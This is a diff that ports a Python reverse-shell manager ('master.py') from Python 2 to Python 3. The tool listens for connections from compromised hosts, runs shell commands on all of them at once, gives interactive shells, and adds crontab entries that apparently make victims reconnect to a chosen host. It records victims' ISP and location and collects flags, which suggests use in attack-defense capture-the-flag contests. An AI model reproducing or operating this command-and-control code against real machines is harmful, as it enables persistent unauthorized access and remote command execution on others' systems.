@@ -9,17 +9,11 @@ import random
 import string
 import sys
 import os
-import readline
 import signal
 import requests
-import json
-import pprint
 import sys
 
-from utils.log import Log
-
-reload(sys)
-sys.setdefaultencoding('utf-8')
+from rshm.utils.log import Log
 
 slaves = {}
 masters = {}
@@ -33,11 +27,13 @@ def submit_flag(flag):
     try:
         # TODO
         url = "http://127.0.0.1:5000/?flag=%s" % (flag)
-        print requests.get(url).content
+        print((requests.get(url).content))
     except Exception as e:
         print(e)
 
 def md5(data):
+    if type(data) == str:
+        data = data.encode()
     return hashlib.md5(data).hexdigest()
 
 
@@ -155,7 +151,7 @@ class Slave():
         self.send_command(payload)
         time.sleep(0.2)
         result = recvall(self.socket_fd)
-        print "%r" % (result)
+        print(("%r") % (result))
         if len(result.split(token)) == 3:
             return result.split(token)[1]
         else:
@@ -173,13 +169,13 @@ class Slave():
         with open(log_file, "a+") as f:
             f.write("[%s]\n" % ("-" * 0x20))
             f.write("From : %s:%d\n" % (self.hostname, self.port))
-            f.write(u"ISP : %s-%s\n" % (self.country, self.isp))
-            f.write(u"Location : %s-%s-%s\n" % (self.area, self.region, self.city))
+            f.write("ISP : %s-%s\n" % (self.country, self.isp))
+            f.write("Location : %s-%s-%s\n" % (self.area, self.region, self.city))
             f.write("Command : %s\n" % (command))
             f.write("%s\n" % (result))
 
     def send_command_print(self, command):
-        print ">>>>>> %s" % command
+        print((">>>>>> %s") % command)
         self.send_command(command)
         time.sleep(0.5)
         Log.info("Receving data from socket...")
@@ -192,7 +188,7 @@ class Slave():
         t.start()
         try:
             while True:
-                command = raw_input()
+                command = input()
                 if command == "exit":
                     self.interactive = False
                     self.socket_fd.send("\n")
@@ -227,7 +223,7 @@ class Slave():
         command = "rm -rf %s" % (target_file)
         self.send_command(command)
         # 6. Receving buffer data
-        print recvall(self.socket_fd)
+        print(recvall(self.socket_fd))
 
     def del_crontab(self, pattern):
         # 1. Save old crontab
@@ -248,7 +244,7 @@ class Slave():
         command = "rm -rf %s" % (target_file)
         self.send_command(command)
         # 6. Receving buffer data
-        print recvall(self.socket_fd)
+        print(recvall(self.socket_fd))
 
     def auto_connect(self, target_host, target_port):
         # self.del_crontab("bash")
@@ -258,7 +254,7 @@ class Slave():
 
     def remove_node(self):
         Log.error("Removing Node!")
-        if self.node_hash in slaves.keys():
+        if self.node_hash in list(slaves.keys()):
             slaves.pop(self.node_hash)
 
 
@@ -274,7 +270,7 @@ def master(host, port):
         slave_fd, slave_addr = master_fd.accept()
         Log.success("\r[+] Slave online : %s:%d" % (slave_addr[0], slave_addr[1]))
         repeat = False
-        for i in slaves.keys():
+        for i in list(slaves.keys()):
             slave = slaves[i]
             if slave.hostname == slave_addr[0]:
                 repeat = True
@@ -292,28 +288,28 @@ def master(host, port):
 
 
 def show_commands():
-    print "Commands : "
-    print "        0. [h|help|?|\\n] : show this help"
-    print "        1. [l] : list all online slaves"
-    print "        2. [p] : log.info(position info"
-    print "        3. [i] : interactive shell"
-    print "        4. [g] : goto a slave"
-    print "        5. [gf] : get flag"
-    print "        6. [gaf] : get all flag"
-    print "        7. [c] : command for all"
-    print "        8. [cronadd] : add crontab"
-    print "        9. [crondel] : del crontab"
-    print "        10. [cl] : command to log"
-    print "        11. [setl] : set local execute"
-    print "        12. [setr] : set remote execute"
-    print "        13. [d] : delete node"
-    print "        14. [ac] : auto connection"
-    print "        15. [aac] : all node auto connction"
-    print "        16. [nm] : listen another port"
-    print "        17. [q|quit|exit] : exit"
+    print ("Commands : ")
+    print ("        0. [h|help|?|\\n] : show this help")
+    print ("        1. [l] : list all online slaves")
+    print ("        2. [p] : log.info(position info")
+    print ("        3. [i] : interactive shell")
+    print ("        4. [g] : goto a slave")
+    print ("        5. [gf] : get flag")
+    print ("        6. [gaf] : get all flag")
+    print ("        7. [c] : command for all")
+    print ("        8. [cronadd] : add crontab")
+    print ("        9. [crondel] : del crontab")
+    print ("        10. [cl] : command to log")
+    print ("        11. [setl] : set local execute")
+    print ("        12. [setr] : set remote execute")
+    print ("        13. [d] : delete node")
+    print ("        14. [ac] : auto connection")
+    print ("        15. [aac] : all node auto connction")
+    print ("        16. [nm] : listen another port")
+    print ("        17. [q|quit|exit] : exit")
 
 def signal_handler(ignum, frame):
-    print ""
+    print("")
     show_commands()
 
 def node_hash(host, port):
@@ -328,8 +324,8 @@ def decode_flag(flag):
 
 def main():
     if len(sys.argv) != 3:
-        print "Usage : "
-        print "\tpython master.py [HOST] [PORT]"
+        print ("Usage : ")
+        print ("\tpython master.py [HOST] [PORT]")
         exit(1)
 
     host = sys.argv[1]
@@ -349,57 +345,57 @@ def main():
     slaver_thread.start()
     time.sleep(0.75)
     show_commands()
-    position = slaves[slaves.keys()[0]].node_hash  # master himself
+    position = slaves[list(slaves.keys())[0]].node_hash  # master himself
     while True:
-        if len(slaves.keys()) == 0:
+        if len(list(slaves.keys())) == 0:
             Log.error("No slaves left , exiting...")
             break
-        if not position in slaves.keys():
+        if not position in list(slaves.keys()):
             Log.error("Node is offline... Changing node...")
-            position = slaves.keys()[0]
+            position = list(slaves.keys())[0]
         current_slave = slaves[position]
         context_hint = "[%s:%d]" % (current_slave.hostname, current_slave.port)
         Log.context(context_hint)
-        command = raw_input(" >> ") or "h"
+        command = input(" >> ") or "h"
         if command.startswith("#"):
             continue
         if command == "h" or command == "help" or command == "?" or command == "\n":
             show_commands()
         elif command == "l":
             Log.info("Listing online slaves...")
-            for key in slaves.keys():
-                print "[%s]" % ("-" * 0x2A)
+            for key in list(slaves.keys()):
+                print(("[%s]") % ("-" * 0x2A))
                 slaves[key].show_info()
-            print "[%s]" % ("-" * 0x2A)
+            print(("[%s]") % ("-" * 0x2A))
         elif command == "p":
             current_slave.show_info()
         elif command == "c":
-            cmd = raw_input("Input command (uname -r) : ") or ("uname -r")
+            cmd = input("Input command (uname -r) : ") or ("uname -r")
             Log.info("Command : %s" % (cmd))
-            for i in slaves.keys():
+            for i in list(slaves.keys()):
                 slave = slaves[i]
                 result = slave.send_command_print(cmd)
         elif command == "cl":
-            cmd = raw_input("Input command (uname -r) : ") or ("uname -r")
+            cmd = input("Input command (uname -r) : ") or ("uname -r")
             Log.info("Command : %s" % (cmd))
-            for i in slaves.keys():
+            for i in list(slaves.keys()):
                 slave = slaves[i]
                 result = slave.send_command_log(cmd)
         elif command == "cronadd":
-            content = raw_input("Input new crontab task (* * * * * date): ") or ("* * * * * date")
+            content = input("Input new crontab task (* * * * * date): ") or ("* * * * * date")
             current_slave.add_crontab(content)
         elif command == "crondel":
-            pattern = raw_input("Input pattern (bash) : ") or ("bash")
+            pattern = input("Input pattern (bash) : ") or ("bash")
             current_slave.del_crontab(pattern)
         elif command == "g":
-            input_node_hash = raw_input(
+            input_node_hash = input(
                 "Please input target node hash : ") or position
             Log.info("Input node hash : %s" % (repr(input_node_hash)))
             if input_node_hash == position:
                 Log.warning("Position will not change!")
                 continue
             found = False
-            for key in slaves.keys():
+            for key in list(slaves.keys()):
                 if key.startswith(input_node_hash):
                     # old_slave = slaves[position]
                     new_slave = slaves[key]
@@ -424,7 +420,7 @@ def main():
                     "192.168.187.128")
                 box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
                 '''
-                for i in slaves.keys():
+                for i in list(slaves.keys()):
                     slave = slaves[i]
                     r_info = open("host").read()
                     r_host = r_info.split(":")[0]
@@ -506,19 +502,19 @@ print result
         elif command == "d":
             current_slave.remove_node()
         elif command == "ac":
-            target_host = raw_input("Target host (192.168.1.1) : ") or ("192.168.1.1")
-            target_port = int(raw_input("Target port (8080) : ") or ("8080"))
+            target_host = input("Target host (192.168.1.1) : ") or ("192.168.1.1")
+            target_port = int(input("Target port (8080) : ") or ("8080"))
             Log.info("Changing crontab...")
             current_slave.auto_connect(target_host, target_port)
         elif command == "aac":
-            target_host = raw_input("Target host (192.168.1.1) : ") or ("192.168.1.1")
-            target_port = int(raw_input("Target port (8080) : ") or ("8080"))
-            for i in slaves.keys():
+            target_host = input("Target host (192.168.1.1) : ") or ("192.168.1.1")
+            target_port = int(input("Target port (8080) : ") or ("8080"))
+            for i in list(slaves.keys()):
                 slave = slaves[i]
                 slave.auto_connect(target_host, target_port)
         elif command == "nm":
-            new_master_host = raw_input("Input new master's host (0.0.0.0): ") or ("0.0.0.0")
-            new_master_port = int(raw_input("Input new master's port (8090): ") or ("8090"))
+            new_master_host = input("Input new master's host (0.0.0.0): ") or ("0.0.0.0")
+            new_master_port = int(input("Input new master's port (8090): ") or ("8090"))
             new_master_thread = threading.Thread(target=master, args=(new_master_host, new_master_port,))
             new_master_thread.daemon = True
             new_master_thread.start()
@@ -528,7 +524,7 @@ print result
             EXIT_FLAG = True
             # TODO : release all resources before closing
             Log.info("Releasing resources...")
-            for key in slaves.keys():
+            for key in list(slaves.keys()):
                 slave = slaves[key]
                 Log.error("Closing conntion of %s:%d" % (slave.hostname, slave.port))
                 slave.socket_fd.shutdown(socket.SHUT_RDWR)
